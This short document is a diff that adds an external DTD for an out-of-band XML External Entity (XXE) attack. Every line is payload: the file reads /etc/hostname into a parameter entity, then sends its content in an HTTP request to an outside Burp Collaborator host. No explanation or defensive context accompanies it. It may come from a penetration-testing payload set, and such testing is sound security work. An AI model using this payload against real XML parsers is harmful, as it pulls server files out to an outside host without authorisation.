@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "file:///etc/hostname">
+<!ENTITY % prepare "<!ENTITY &#x25; exfil SYSTEM 'http://gm6mub3vzp91ldfx3moi2kxhz850tp.burpcollaborator.net?c=%data;'>">
+%prepare;
+%exfil;
